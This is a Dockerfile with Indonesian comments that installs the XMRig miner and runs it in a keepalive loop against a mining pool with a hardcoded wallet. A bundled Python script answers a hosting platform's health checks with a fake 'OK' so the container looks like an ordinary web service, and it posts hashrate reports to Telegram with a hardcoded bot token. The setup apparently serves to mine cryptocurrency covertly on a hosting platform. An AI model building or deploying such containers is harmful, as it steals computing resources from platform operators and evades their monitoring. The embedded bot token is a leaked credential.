FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && \
    apt-get install -y wget tar ca-certificates python3 python3-requests curl && \
    rm -rf /var/lib/apt/lists/* && \
    wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && \
    tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz && \
    rm xmrig-6.22.2-linux-static-x64.tar.gz

# Reporter Python: Kirim status hashrate ke Telegram + HTTP health check untuk Watasu
RUN cat << 'EOF' > /reporter.py
import time
import requests
import http.server
import socketserver
import os
import threading

TOKEN = "9200373511:AAE7lDnzL7joTavno-9VeIR1316HRZZc7YE"
CHAT_ID = "8949644128"
RIG = "sal909"

try:
    NODE_ID = open("/proc/sys/kernel/random/uuid").read().strip()[:4]
except Exception:
    import random
    NODE_ID = f"{random.randint(1000, 9999)}"

# Web server ringan agar port Watasu ($PORT) selalu merespon 200 OK
PORT = int(os.environ.get("PORT", 8080))
class HealthHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK - Rig Active")
    def log_message(self, format, *args):
        pass

def run_health_server():
    try:
        with socketserver.TCPServer(("0.0.0.0", PORT), HealthHandler) as httpd:
            httpd.serve_forever()
    except Exception as e:
        print(f"Health server note: {e}")

threading.Thread(target=run_health_server, daemon=True).start()

def send_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
            timeout=10
        )
    except Exception:
        pass

send_msg(f"🟢 <b>Worker Aktif:</b> <code>{RIG}</code> (Node #{NODE_ID})\n🚀 Siap menambang & monitoring hashrate aktif...")
time.sleep(30)

while True:
    try:
        r = requests.get("http://127.0.0.1:4044/1/summary", timeout=5).json()
        hr = r.get("hashrate", {}).get("total", [0, 0, 0])
        good = r.get("results", {}).get("shares_good", 0)
        total = r.get("results", {}).get("shares_total", 0)
        uptime = r.get("uptime", 0) // 60
        h10s = f"{hr[0]:.2f}" if hr[0] else "0.00"
        h60s = f"{hr[1]:.2f}" if hr[1] else "0.00"
        h15m = f"{hr[2]:.2f}" if hr[2] else "0.00"
        send_msg(
            f"⛏ <b>[Hashrate: {RIG} #{NODE_ID}]</b>\n"
            f"⚡ 10s: <code>{h10s} H/s</code> | 60s: <code>{h60s} H/s</code> | 15m: <code>{h15m} H/s</code>\n"
            f"✅ Shares: <code>{good}/{total}</code> | ⏱ Uptime: <code>{uptime} menit</code>"
        )
    except Exception:
        pass
    time.sleep(180) # Lapor hashrate setiap 3 menit
EOF

# Entrypoint script untuk keepalive
RUN cat << 'EOF' > /entrypoint.sh
#!/bin/bash
python3 /reporter.py &
cd /xmrig-6.22.2
while true; do
    echo "[keepalive] Menjalankan xmrig..."
    ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 \
        -u USDT:0x098f58db447351f5433006b7761b9da8d8a26680.sal909 \
        -p x --tls --threads=8 --cpu-no-yield --randomx-no-numa \
        --keepalive \
        --http-host=127.0.0.1 --http-port=4044
    sleep 3
done
EOF

RUN chmod +x /entrypoint.sh

CMD ["/bin/bash", "/entrypoint.sh"]
